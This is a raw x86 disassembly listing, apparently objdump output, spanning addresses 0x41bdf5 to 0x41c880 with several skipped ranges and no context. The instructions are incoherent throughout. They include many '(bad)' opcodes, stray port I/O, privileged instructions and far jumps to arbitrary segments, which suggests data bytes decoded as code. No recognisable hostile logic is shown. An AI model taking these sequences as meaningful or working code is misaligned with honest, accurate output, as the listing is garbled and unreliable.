  41bdf5:	arpl   bp,di
  41bdf7:	mov    al,ds:0xdbb96d61
  41bdfc:	push   esi
  41bdfd:	or     DWORD PTR [ebx],esi
  41bdff:	add    eax,0xa7622cda
  41be04:	sti    
  41be05:	rol    DWORD PTR [edi],0x5
  41be08:	cwde   
  41be09:	ret    0xfb87
  41be0c:	(bad)
  41be0f:	cmp    al,0x9d
  41be11:	ja     0x41be66
  41be13:	xor    al,0x88
  41be15:	xor    eax,0xb9de3678
  41be1a:	ds or  al,0x13
  41be1d:	and    eax,DWORD PTR [esi+0x15c94327]
  41be23:	lods   al,BYTE PTR es:[esi]
  41be25:	jbe    0x41be70
  41be27:	mov    esi,0xa66c0fe5
  41be2c:	out    dx,al
  41be2d:	repz les ebx,FWORD PTR ds:0x23df569c
  41be34:	dec    esp
  41be35:	sti    
  41be36:	in     al,0x11
  41be38:	leave  
  41be39:	retf   0xddf8
  41be3c:	inc    edx
  41be3d:	or     dh,BYTE PTR [ecx+0xf1dce6]
	...
  41beb3:	add    ch,al
  41beb5:	stc    
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	seta   bh
  41bec2:	xchg   esi,eax
  41bec3:	in     eax,0x9e
  41bec5:	sub    eax,0xf60001
  41beca:	add    BYTE PTR [eax],al
  41becc:	inc    edi
  41becd:	hlt    
  41bece:	aad    0x0
  41bed0:	enter  0xb06d,0x76
  41bed4:	jb     0x41bea4
  41bed6:	mov    al,0x68
  41bed8:	xchg   edx,eax
  41bed9:	xchg   ebp,eax
  41beda:	pop    edi
  41bedb:	pop    ss
  41bedc:	iret   
  41bedd:	xor    al,0xad
  41bedf:	jne    0x41bebb
  41bee1:	jmp    0x87bd0799
  41bee6:	jbe    0x41bf32
  41bee8:	jne    0x41bef6
  41beea:	push   0xffffffe2
  41beec:	xchg   BYTE PTR [eax+0x5c],dl
  41beef:	js     0x41bee6
  41bef1:	ds pop ebp
  41bef3:	ins    DWORD PTR es:[edi],dx
  41bef4:	mov    dl,0xcf
  41bef6:	pop    edi
  41bef7:	addr16 mov al,ds:0xedcc
  41befb:	add    dl,BYTE PTR [ecx-0x40]
  41befe:	mov    ch,0x60
  41bf00:	out    0x5f,al
  41bf02:	enter  0x227c,0x92
  41bf06:	mov    esi,0xb9fbfd6e
  41bf0b:	xchg   edi,eax
  41bf0c:	sub    cl,BYTE PTR [ecx+0x197ea579]
  41bf12:	mov    ebx,edx
  41bf14:	pop    esp
  41bf15:	(bad)  
  41bf16:	cmc    
  41bf17:	retf   
  41bf18:	sub    eax,0x99a726cd
  41bf1d:	mov    eax,ds:0x42eba270
  41bf22:	xchg   ecx,eax
  41bf23:	test   eax,0x49097efa
  41bf28:	cli    
  41bf29:	les    edi,FWORD PTR [edi-0x4d]
  41bf2c:	lea    edi,[edi+0x2a]
  41bf2f:	mov    dh,0x7e
  41bf31:	ja     0x41bf2f
  41bf33:	scas   eax,DWORD PTR es:[edi]
  41bf34:	es arpl dx,ax
  41bf37:	adc    ebp,esp
  41bf39:	aas    
  41bf3a:	ja     0x41befc
  41bf3c:	not    BYTE PTR [edi-0x59]
  41bf3f:	lea    edi,[ebx+ebx*1-0x449d7f3a]
  41bf46:	stos   BYTE PTR es:[edi],al
  41bf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf48:	outs   dx,BYTE PTR ds:[esi]
  41bf49:	adc    DWORD PTR [edx-0x29],0x4f
  41bf4d:	mov    bl,0x46
  41bf4f:	cmp    cl,BYTE PTR [ebx+0x4778ed3a]
  41bf55:	enter  0xd39d,0x18
  41bf59:	pop    esp
  41bf5a:	or     eax,0xe84ceb
  41bf5f:	xchg   esp,eax
  41bf60:	dec    ecx
  41bf61:	push   ebp
  41bf62:	xor    cl,BYTE PTR [ebp-0x5a]
  41bf65:	cmp    cl,ah
  41bf67:	push   ecx
  41bf68:	mov    ah,0xe2
  41bf6a:	pop    esp
  41bf6b:	xchg   BYTE PTR [ebx-0x5b],ch
  41bf6e:	xchg   ebp,eax
  41bf6f:	cdq    
  41bf70:	and    DWORD PTR [edx+0x4e0424fb],esi
  41bf76:	loopne 0x41befb
  41bf78:	pop    eax
  41bf79:	lahf   
  41bf7a:	mov    al,ds:0xa878b3e7
  41bf7f:	xor    al,BYTE PTR [edx-0x116cf02a]
  41bf85:	loopne 0x41bfa3
  41bf87:	arpl   WORD PTR [edi-0x59],dx
  41bf8a:	adc    ebp,DWORD PTR [edx]
  41bf8c:	inc    ebx
  41bf8d:	sub    ebp,DWORD PTR [ebp-0x1865c3b7]
  41bf93:	in     al,0x67
  41bf95:	call   0x2e6b9868
  41bf9a:	aad    0x3c
  41bf9c:	push   0xffffff9b
  41bf9e:	imul   edx,DWORD PTR [ebp+0x77e538c],0xd6a39fb7
  41bfa8:	rol    DWORD PTR [edx],0xdd
  41bfab:	sbb    eax,0xb501d20c
  41bfb0:	or     ah,BYTE PTR [edx+edi*1+0x44]
  41bfb4:	in     eax,dx
  41bfb5:	mov    bl,0xfe
  41bfb7:	pushf  
  41bfb8:	cmp    BYTE PTR [edx-0x13],cl
  41bfbb:	sahf   
  41bfbc:	mov    dh,0xd2
  41bfbe:	add    BYTE PTR [edx+0x53],dl
  41bfc1:	sub    DWORD PTR [eax],eax
	...
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x244657f]
  41c041:	rol    DWORD PTR [eax+ecx*8],0x94
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	test   BYTE PTR [eax],0x0
  41c04b:	add    BYTE PTR [esi+0x35e68cf6],bl
  41c051:	gs out 0x9,eax
  41c054:	jno    0x41c03f
  41c056:	ins    DWORD PTR es:[edi],dx
  41c057:	je     0x41c017
  41c059:	aad    0x2c
  41c05b:	adc    al,0xc0
  41c05d:	popf   
  41c05e:	popa   
  41c05f:	inc    esp
  41c060:	inc    edi
  41c061:	mov    ah,0x44
  41c063:	test   al,0xcc
  41c065:	les    ecx,FWORD PTR [ebp-0x1f]
  41c068:	mov    eax,ds:0x8c98b972
  41c06d:	mov    eax,0xcf8d016f
  41c072:	data16 idiv BYTE PTR [ecx+ebx*8]
  41c076:	fadd   DWORD PTR [edx]
  41c078:	xchg   BYTE PTR [edx-0x7efc0d5a],ch
  41c07e:	mov    cl,0x91
  41c080:	(bad)  [ebp+ebx*2-0x57]
  41c084:	jno    0x41c0a6
  41c086:	or     DWORD PTR [ecx],ebx
  41c088:	sbb    bl,BYTE PTR [esp+ebx*4]
  41c08b:	fwait
  41c08c:	(bad)  
  41c08d:	out    0x48,eax
  41c08f:	mov    BYTE PTR ss:0x2a2d4ee1,al
  41c096:	loope  0x41c033
  41c098:	(bad)  
  41c099:	adc    al,0x5e
  41c09b:	shl    DWORD PTR [esi+0x35c56461],0x12
  41c0a2:	sub    bh,ah
  41c0a4:	xor    eax,0xe0343cfa
  41c0a9:	mov    DWORD PTR fs:[edi+esi*1-0x4ab98c23],ebp
  41c0b1:	jmp    0xccff:0x3237b6c9
  41c0b8:	aaa    
  41c0b9:	mov    dl,0xad
  41c0bb:	xchg   ebp,eax
  41c0bc:	sub    BYTE PTR [edx+0x45d7f17b],cl
  41c0c2:	out    0xe7,al
  41c0c4:	(bad)  
  41c0c5:	clc    
  41c0c6:	stc    
  41c0c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c8:	jmp    0x6468867e
  41c0cd:	test   BYTE PTR [ecx],cl
  41c0cf:	jbe    0x41c05b
  41c0d1:	out    dx,eax
  41c0d2:	gs adc edx,edx
  41c0d5:	mov    ecx,edx
  41c0d7:	pop    es
  41c0d8:	sbb    ebx,DWORD PTR [ecx+ebx*4+0x7]
  41c0dc:	sub    DWORD PTR [ebp+0x62],0x55
  41c0e0:	push   esp
  41c0e1:	(bad)  
  41c0e2:	and    BYTE PTR [esi-0x6b10d4fd],al
  41c0e8:	retf   
  41c0e9:	fnstenv [edi]
  41c0eb:	mov    al,0x45
  41c0ed:	mov    esi,eax
  41c0ef:	jne    0x41c0b7
  41c0f1:	fadd   DWORD PTR [esi-0x7cd68c19]
  41c0f7:	out    0x53,eax
  41c0f9:	je     0x41c0e0
  41c0fb:	test   dl,ah
  41c0fd:	leave  
  41c0fe:	fnsave ds:[ebx-0x1c0ef9e4]
  41c105:	aaa    
  41c106:	mov    cl,0x16
  41c108:	push   ebp
  41c109:	imul   ebp,DWORD PTR [ebp-0x6c7ec8c],0xfffffff8
  41c110:	push   ds
  41c111:	mov    ecx,DWORD PTR [esi]
  41c113:	add    BYTE PTR ds:0x1a316c4d,ch
  41c119:	mov    edi,0xfbac8b94
  41c11e:	dec    edi
  41c11f:	push   0xe47c7e07
  41c124:	mov    al,ds:0xe21d111
  41c129:	xchg   ecx,eax
  41c12a:	xor    edi,ebp
  41c12c:	inc    esi
  41c12d:	out    dx,al
  41c12e:	out    dx,eax
  41c12f:	ja     0x41c0b3
  41c131:	mov    BYTE PTR [ebx],cl
  41c133:	std    
  41c134:	mov    fs,esp
  41c136:	retf   
  41c137:	adc    al,0xe0
  41c139:	mov    bl,0x8b
  41c13b:	or     dh,BYTE PTR [ebx+0x9]
  41c13e:	add    ax,0x1581
	...
  41c1b2:	add    BYTE PTR [eax],al
  41c1b4:	mov    fs,WORD PTR [ebp-0x13941f97]
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x7c164f38
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    BYTE PTR [edi+0x9],ah
  41c1ce:	dec    eax
  41c1cf:	scas   al,BYTE PTR es:[edi]
  41c1d0:	or     al,0x4e
  41c1d2:	scas   al,BYTE PTR es:[edi]
  41c1d3:	imul   edi,DWORD PTR [esi],0x86bab33e
  41c1d9:	jmp    0xdc97:0x65517438
  41c1e0:	push   esi
  41c1e1:	dec    esp
  41c1e2:	sti    
  41c1e3:	mov    ds,WORD PTR [ecx-0x1f]
  41c1e6:	jge    0x41c215
  41c1e8:	test   al,0xcc
  41c1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1eb:	out    dx,eax
  41c1ec:	test   eax,0x4ed0004d
  41c1f1:	and    al,0xf3
  41c1f3:	xlat   BYTE PTR ds:[ebx]
  41c1f4:	or     esi,edi
  41c1f6:	lods   eax,DWORD PTR ds:[esi]
  41c1f7:	fidiv  WORD PTR [eax-0x40]
  41c1fa:	loope  0x41c1c0
  41c1fc:	(bad)  
  41c1fd:	js     0x41c1fc
  41c1ff:	adc    eax,0x250d882c
  41c204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c205:	data16 loopne 0x41c253
  41c208:	jno    0x41c279
  41c20a:	adc    BYTE PTR [eax],bl
  41c20c:	clc    
  41c20d:	or     ah,BYTE PTR [ebp+0x2c957a29]
  41c213:	or     eax,0xadb7fe8c
  41c218:	or     bh,ah
  41c21a:	cmc    
  41c21b:	cdq    
  41c21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21d:	das    
  41c21e:	shr    ah,cl
  41c220:	imul   eax,DWORD PTR [esi],0x9fedeb4f
  41c226:	push   edi
  41c227:	mov    ebx,0x62be2ff0
  41c22c:	cmp    BYTE PTR [esi+ebx*8],dl
  41c22f:	enter  0xbc33,0xb9
  41c233:	and    BYTE PTR [ebx-0x65],bl
  41c236:	lock mov al,ds:0x3e2db56f
  41c23c:	in     eax,dx
  41c23d:	pop    ecx
  41c23e:	icebp  
  41c23f:	loop   0x41c203
  41c241:	push   esp
  41c242:	lock jbe 0x41c1ec
  41c245:	push   es
  41c246:	js     0x41c281
  41c248:	add    DWORD PTR [ebx],ebx
  41c24a:	ds daa 
  41c24c:	jmp    0xaf13:0x9996d077
  41c253:	sub    al,0x58
  41c255:	jbe    0x41c224
  41c257:	xchg   ebx,eax
  41c258:	push   0xa952b5a9
  41c25d:	mov    esi,0xde83ca44
  41c262:	mov    dh,0xc
  41c264:	icebp  
  41c265:	cdq    
  41c266:	pop    edx
  41c267:	(bad)  
  41c268:	fcom   QWORD PTR [edx+0x1d]
  41c26b:	sar    BYTE PTR [ebx+ecx*4+0x7bbb15f8],cl
  41c272:	imul   ebp,DWORD PTR [eax],0xafa0b243
  41c278:	mov    esp,0xd276a73
  41c27d:	(bad)  
  41c27e:	jmp    0x8cb398d0
  41c283:	xchg   DWORD PTR [esi],edi
  41c285:	scas   al,BYTE PTR es:[edi]
  41c286:	cwde   
  41c287:	sbb    edi,DWORD PTR [esi+0x753fb7c4]
  41c28d:	js     0x41c304
  41c28f:	sti    
  41c290:	jnp    0x41c26b
  41c292:	neg    DWORD PTR [ecx-0x67]
  41c295:	sbb    al,0x65
  41c297:	jne    0x41c224
  41c299:	dec    edi
  41c29a:	ins    DWORD PTR es:[edi],dx
  41c29b:	leave  
  41c29c:	pop    ecx
  41c29d:	out    0x90,al
  41c29f:	jne    0x41c31e
  41c2a1:	lock mov DWORD PTR [edi+esi*2],0x5fe16cbc
  41c2a9:	inc    ecx
  41c2aa:	mov    edx,0x1aee3450
  41c2af:	jae    0x41c2b0
  41c2b1:	rol    DWORD PTR [esi-0x244a71f3],cl
  41c2b7:	test   eax,0xa4b22f53
  41c2bc:	sub    bl,BYTE PTR [ecx+edx*2+0x265ad9]
	...
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	dec    eax
  41c341:	fincstp 
  41c343:	test   BYTE PTR [eax-0x9fffed0],al
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ebx+edi*1+0x5],cl
  41c34f:	push   0xb1250630
  41c354:	mov    ds:0xe8fd4581,al
  41c359:	arpl   di,dx
  41c35b:	cmp    BYTE PTR [edi-0x50485fc8],cl
  41c361:	xchg   esi,eax
  41c362:	mov    cl,cl
  41c364:	push   esi
  41c365:	mov    al,0xbf
  41c367:	cdq    
  41c368:	sbb    ah,BYTE PTR [edx+0x2d6ae02c]
  41c36e:	cld    
  41c36f:	(bad)  
  41c370:	aam    0xe2
  41c372:	and    esi,ebx
  41c374:	imul   edi,ebp,0x6f
  41c377:	lds    ebx,FWORD PTR [ecx]
  41c379:	retf   
  41c37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c37b:	and    ebp,eax
  41c37d:	sub    DWORD PTR [ecx],eax
  41c37f:	or     al,0x1f
  41c381:	sar    DWORD PTR [esi+0x28999219],0x35
  41c388:	and    eax,0x8d54b833
  41c38d:	sbb    eax,0x6cf1a463
  41c392:	dec    esi
  41c393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c394:	push   es
  41c395:	lock and DWORD PTR [ebx],ebp
  41c398:	mov    esi,0x12c1fcf1
  41c39d:	jae    0x41c3e6
  41c39f:	cmp    bl,BYTE PTR [ebx+0x25f8c1bf]
  41c3a5:	(bad)  
  41c3a6:	adc    BYTE PTR [ecx],cl
  41c3a8:	les    esi,FWORD PTR [ecx-0x31c32525]
  41c3ae:	dec    esp
  41c3af:	mov    ss,WORD PTR [ebx-0x11]
  41c3b2:	inc    ecx
  41c3b3:	cli    
  41c3b4:	mov    esi,0x7ee0f72b
  41c3b9:	mov    bh,0xe0
  41c3bb:	mov    BYTE PTR [esi],ah
  41c3bd:	cmp    DWORD PTR [edx-0x45],eax
  41c3c0:	and    al,0xe
  41c3c2:	jge    0x41c35b
  41c3c4:	shl    bl,0x2b
  41c3c7:	inc    esp
  41c3c8:	sbb    ecx,ebx
  41c3ca:	popf   
  41c3cb:	xchg   esi,eax
  41c3cc:	(bad)
  41c3d0:	xchg   edi,eax
  41c3d1:	sahf   
  41c3d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3d3:	imul   ebp,DWORD PTR [edi-0x12dee247],0xe15a0f4f
  41c3dd:	imul   edi,DWORD PTR [ebx],0x43
  41c3e0:	sbb    DWORD PTR [edx+edx*2-0x44ef3346],eax
  41c3e7:	push   0xffffff9b
  41c3e9:	sub    bh,bh
  41c3eb:	gs or  eax,0xd510ae3a
  41c3f1:	pop    edx
  41c3f2:	xor    BYTE PTR [eax+eiz*4+0x40],bl
  41c3f6:	pop    eax
  41c3f7:	mov    bl,0xe6
  41c3f9:	daa    
  41c3fa:	pusha  
  41c3fb:	mov    ds:0x1a0cf410,al
  41c400:	in     eax,dx
  41c401:	sub    DWORD PTR [esi],ecx
  41c403:	xchg   ebp,eax
  41c404:	hlt    
  41c405:	dec    esi
  41c406:	dec    ecx
  41c407:	jae    0x41c3ce
  41c409:	inc    ebx
  41c40a:	jbe    0x41c483
  41c40c:	fst    QWORD PTR [ecx+0x50247641]
  41c412:	xchg   edx,eax
  41c413:	and    DWORD PTR [ebp-0x2a],ebx
  41c416:	not    DWORD PTR [ebx]
  41c418:	sbb    DWORD PTR [ebp-0x5c],eax
  41c41b:	push   ebx
  41c41c:	fsubr  st,st(4)
  41c41e:	not    DWORD PTR [eax+edi*8-0x3c9b5544]
  41c425:	lock (bad) 
  41c427:	enter  0xfa5,0x33
  41c42b:	mov    cl,0x9a
  41c42d:	test   eax,0x9d1ca70
  41c432:	ds cdq 
  41c434:	loope  0x41c3f5
  41c436:	mov    ah,0x6a
  41c438:	mov    bh,0xe5
  41c43a:	adc    al,0x8
  41c43c:	dec    eax
  41c43d:	adc    DWORD PTR ds:0x94cc12,esi
	...
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx-0x78f7259c]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    BYTE PTR [edx+0x77f21485],bl
  41c4d1:	stc    
  41c4d2:	push   ss
  41c4d3:	jb     0x41c475
  41c4d5:	dec    eax
  41c4d6:	ret    
  41c4d7:	xchg   esi,eax
  41c4d8:	inc    esi
  41c4d9:	pop    esp
  41c4da:	pop    ecx
  41c4db:	sahf   
  41c4dc:	jno    0x41c47f
  41c4de:	dec    edx
  41c4df:	out    0xf8,al
  41c4e1:	mov    dh,0x7c
  41c4e3:	or     bl,bh
  41c4e5:	lods   al,BYTE PTR ds:[esi]
  41c4e6:	mul    bl
  41c4e8:	mov    dl,0x4a
  41c4ea:	push   eax
  41c4eb:	and    edx,DWORD PTR [ebp+0x20b05e95]
  41c4f1:	imul   ebx,DWORD PTR [edi+0x284e6aaa],0x66
  41c4f8:	test   BYTE PTR [ebx],0x6d
  41c4fb:	xchg   ecx,eax
  41c4fc:	jg     0x41c539
  41c4fe:	xor    eax,0x2bbe8b17
  41c503:	popa   
  41c504:	push   0xffffffcc
  41c506:	out    0x35,al
  41c508:	repnz ins DWORD PTR es:[edi],dx
  41c50a:	xchg   ebp,eax
  41c50b:	cwde   
  41c50c:	mov    ebx,0x2e3f0fbb
  41c511:	jge    0x41c592
  41c513:	xchg   esp,eax
  41c514:	clc    
  41c515:	or     edx,DWORD PTR [esi-0x6b]
  41c518:	pop    ecx
  41c519:	mov    bl,0x8a
  41c51b:	adc    al,0x5f
  41c51d:	xchg   DWORD PTR [eax-0x77edcbcc],edi
  41c523:	ret    0x9008
  41c526:	add    ax,0x53b3
  41c52a:	dec    cl
  41c52c:	or     cl,BYTE PTR [edi-0x22]
  41c52f:	clc    
  41c530:	ins    BYTE PTR es:[edi],dx
  41c531:	adc    esi,DWORD PTR [ecx-0x15]
  41c534:	pushf  
  41c535:	inc    ebx
  41c536:	sub    bl,0xc5
  41c539:	leave  
  41c53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c53b:	xor    DWORD PTR [esi+ebp*2],eax
  41c53e:	pop    ebx
  41c53f:	test   BYTE PTR [ebx],bh
  41c541:	aam    0x72
  41c543:	icebp  
  41c544:	scas   eax,DWORD PTR es:[edi]
  41c545:	mov    dl,0xae
  41c547:	mov    eax,0xb7192cde
  41c54c:	sbb    eax,esp
  41c54e:	test   DWORD PTR [ebp-0x7e8a6a3],edx
  41c554:	push   cs
  41c555:	pop    ss
  41c556:	loop   0x41c506
  41c558:	pop    ss
  41c559:	outs   dx,DWORD PTR ds:[esi]
  41c55a:	mov    dh,0x88
  41c55c:	nop
  41c55d:	cmp    al,0xe
  41c55f:	(bad)
  41c563:	fild   QWORD PTR [esi]
  41c565:	push   ebx
  41c566:	stc    
  41c567:	adc    BYTE PTR ds:0x67b6f849,ch
  41c56d:	ret    0x154
  41c570:	icebp  
  41c571:	popaw  
  41c573:	mov    ah,0x60
  41c575:	(bad)  
  41c576:	int3   
  41c577:	call   0x3cb9c44e
  41c57c:	mov    esp,0x54547142
  41c581:	fwait
  41c582:	outs   dx,BYTE PTR ds:[esi]
  41c583:	dec    ebx
  41c584:	fbstp  TBYTE PTR [esi]
  41c586:	popa   
  41c587:	xchg   esp,eax
  41c588:	xor    al,0x90
  41c58a:	ss inc edx
  41c58c:	xchg   BYTE PTR [ebp-0xf],bl
  41c58f:	and    cl,BYTE PTR [edi+edi*4]
  41c592:	xchg   BYTE PTR [ebp-0x7c],dl
  41c595:	and    eax,0x6a3896ea
  41c59a:	jg     0x41c5d3
  41c59c:	mov    cl,0x57
  41c59e:	jle    0x41c5d0
  41c5a0:	jnp    0x41c607
  41c5a2:	addr16 pop ebx
  41c5a4:	jg     0x41c579
  41c5a6:	(bad)  
  41c5a7:	jle    0x41c5a8
  41c5a9:	out    0x7a,al
  41c5ab:	(bad)  
  41c5ac:	retf   
  41c5ad:	dec    ebx
  41c5ae:	mov    dh,0xe0
  41c5b0:	cs not ch
  41c5b3:	cmc    
  41c5b4:	sahf   
  41c5b5:	sahf   
  41c5b6:	mov    ecx,0x8017b7a5
  41c5bb:	cmp    BYTE PTR [ebx],ch
  41c5bd:	test   DWORD PTR [edi+0xee1286],edx
	...
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	adc    esp,edi
  41c642:	out    0x13,al
  41c644:	ins    BYTE PTR es:[edi],dx
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    dh,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [ecx-0x3813d385],dh
  41c651:	add    BYTE PTR [esi],0xf1
  41c654:	xor    ebx,ebp
  41c656:	int    0x43
  41c658:	add    BYTE PTR ds:0x7539b99d,al
  41c65e:	dec    ecx
  41c65f:	ror    BYTE PTR ds:0xc7b5afa2,0x15
  41c666:	jmp    0x41c60f
  41c668:	pop    ebx
  41c669:	imul   edi,ebp,0x2a
  41c66c:	push   eax
  41c66d:	scas   eax,DWORD PTR es:[edi]
  41c66e:	mov    ch,0x92
  41c670:	ret    0xb80c
  41c673:	test   BYTE PTR [ecx],al
  41c675:	scas   eax,DWORD PTR es:[edi]
  41c676:	mov    al,0xbb
  41c678:	xor    ecx,eax
  41c67a:	sub    dl,0x92
  41c67d:	xor    BYTE PTR [eax],al
  41c67f:	inc    ecx
  41c680:	dec    esi
  41c681:	jl     0x41c6a8
  41c683:	jmp    0x51b8:0x65b45970
  41c68a:	(bad)  
  41c68b:	std    
  41c68c:	inc    ecx
  41c68d:	mov    WORD PTR [edx+0x47],gs
  41c690:	into   
  41c691:	addr16 push eax
  41c693:	out    0xa,al
  41c695:	add    al,0x49
  41c697:	jmp    0x2fee:0x43989728
  41c69e:	xor    DWORD PTR [ecx-0x2d45df24],edi
  41c6a4:	jbe    0x41c6b3
  41c6a6:	or     al,0xbf
  41c6a8:	call   0x7874:0xfa68a8d7
  41c6af:	mov    ebx,es
  41c6b1:	sub    DWORD PTR [ebx+edx*8],eax
  41c6b4:	adc    DWORD PTR [ecx],esp
  41c6b6:	call   0x71668df8
  41c6bb:	lahf   
  41c6bc:	in     al,dx
  41c6bd:	je     0x41c6b7
  41c6bf:	pop    ebx
  41c6c0:	add    edx,DWORD PTR [edi+0x638dd8b2]
  41c6c6:	mov    ch,0x91
  41c6c8:	xchg   ebx,eax
  41c6c9:	out    0x13,al
  41c6cb:	mov    edi,0x73cfcb4f
  41c6d0:	fisubr WORD PTR [ecx+0x52972a92]
  41c6d6:	mov    eax,ds:0x8896171b
  41c6db:	inc    eax
  41c6dc:	test   al,0xaf
  41c6de:	ins    BYTE PTR es:[edi],dx
  41c6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e0:	sbb    bl,BYTE PTR [eax]
  41c6e2:	mov    eax,ds:0xb566b231
  41c6e7:	or     BYTE PTR [edi],cl
  41c6e9:	cwde   
  41c6ea:	dec    edx
  41c6eb:	test   DWORD PTR [eax+0x443ee16a],edi
  41c6f1:	out    dx,eax
  41c6f2:	or     eax,0x29d0866b
  41c6f7:	inc    esi
  41c6f8:	test   eax,0xa127be55
  41c6fd:	fwait
  41c6fe:	adc    al,0x4f
  41c700:	add    dh,BYTE PTR [eax]
  41c702:	pop    ds
  41c703:	jne    0x41c6cc
  41c705:	repnz push edi
  41c707:	idiv   BYTE PTR [ebx+edx*4-0x67300c20]
  41c70e:	enter  0x8f41,0xd5
  41c712:	arpl   WORD PTR [edx-0x7d],dx
  41c715:	push   ss
  41c716:	mov    ecx,0x7182e7f4
  41c71b:	clc    
  41c71c:	stos   DWORD PTR es:[edi],eax
  41c71d:	in     al,0xdc
  41c71f:	fs pop ebp
  41c721:	imul   DWORD PTR [edi-0x3d428f20]
  41c727:	ds inc ebp
  41c729:	iret   
  41c72a:	sub    DWORD PTR [ebx-0x5c],0xffffff86
  41c72e:	in     al,dx
  41c72f:	ret    0x9cba
  41c732:	pop    edi
  41c733:	fwait
  41c734:	out    0xf3,eax
  41c736:	jne    0x41c78e
  41c738:	or     ebx,DWORD PTR [ebx+0x16]
  41c73b:	pop    eax
  41c73c:	enter  0x4ea8,0x3
  41c740:	jmp    FWORD PTR [ebp+0x0]
	...
  41c7b2:	add    BYTE PTR [eax],al
  41c7b4:	mov    bh,ah
  41c7b6:	(bad)  
  41c7b7:	dec    esi
  41c7b8:	idiv   DWORD PTR [edi-0x75]
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0xe996d854
  41c7c3:	pop    esp
  41c7c4:	bound  esi,QWORD PTR [ebx]
  41c7c6:	add    DWORD PTR [eax],eax
  41c7c8:	test   BYTE PTR [eax],0x0
  41c7cb:	add    BYTE PTR [ebx],ch
  41c7cd:	scas   al,BYTE PTR es:[edi]
  41c7ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7cf:	pop    ebx
  41c7d0:	cmp    BYTE PTR [ecx-0x1d],ch
  41c7d3:	mov    esp,0xace0f2
  41c7d8:	ficomp DWORD PTR [ecx-0xe]
  41c7db:	sbb    al,0x53
  41c7dd:	mov    dl,0x38
  41c7df:	jne    0x41c7af
  41c7e1:	loopne 0x41c7af
  41c7e3:	mov    WORD PTR [eax+ecx*4+0x438cc290],?
  41c7ea:	mov    bh,0x16
  41c7ec:	stc    
  41c7ed:	xor    eax,esi
  41c7ef:	add    al,0xe6
  41c7f1:	push   0xbc64b40d
  41c7f6:	shl    bh,0xf0
  41c7f9:	ret    0x4438
  41c7fc:	aas    
  41c7fd:	sbb    dh,BYTE PTR [edi+edi*8-0x69]
  41c801:	repz mov edi,0x3ca139d3
  41c807:	cmpxchg DWORD PTR [edi-0x37],ecx
  41c80b:	cmp    eax,0xff16d674
  41c810:	retf   0xf5a4
  41c813:	or     eax,DWORD PTR [edx-0x4ee7c682]
  41c819:	test   DWORD PTR [ecx+0x4f],ebp
  41c81c:	jmp    0x7c13384
  41c821:	mov    al,0xe5
  41c823:	pop    edi
  41c824:	(bad)  
  41c825:	mov    al,ds:0xc80d3652
  41c82a:	or     esi,esp
  41c82c:	mov    bl,0xa1
  41c82e:	test   al,0xa8
  41c830:	sti    
  41c831:	faddp  st(0),st
  41c833:	mov    eax,ds:0x365e62d2
  41c838:	sub    esi,edx
  41c83a:	cmc    
  41c83b:	pop    es
  41c83c:	out    dx,al
  41c83d:	imul   ebx,DWORD PTR [eax+0x1a3f3267],0x8ded6d43
  41c847:	popa   
  41c848:	out    dx,eax
  41c849:	call   0xa47:0x2567fae3
  41c850:	es and eax,0x7ce7b0fe
  41c856:	mov    BYTE PTR [ebp-0x250c240c],ch
  41c85c:	out    0x8b,al
  41c85e:	fsub   DWORD PTR [edx+0x7a870b1d]
  41c864:	mov    cl,0xe6
  41c866:	out    0x13,eax
  41c868:	scas   al,BYTE PTR es:[edi]
  41c869:	mov    edi,0xe568ae72
  41c86e:	ss xchg edx,eax
  41c870:	stc    
  41c871:	test   DWORD PTR [ebp+esi*8+0x63],esp
  41c875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c876:	inc    ebp
  41c877:	inc    edi
  41c878:	xor    ch,BYTE PTR [ebx+edi*8]
  41c87b:	nop
  41c87c:	mov    cl,0xc8
  41c87e:	inc    ecx
  41c87f:	outs   dx,BYTE PTR ds:[esi]
  41c880:	mov    cl,0xaf
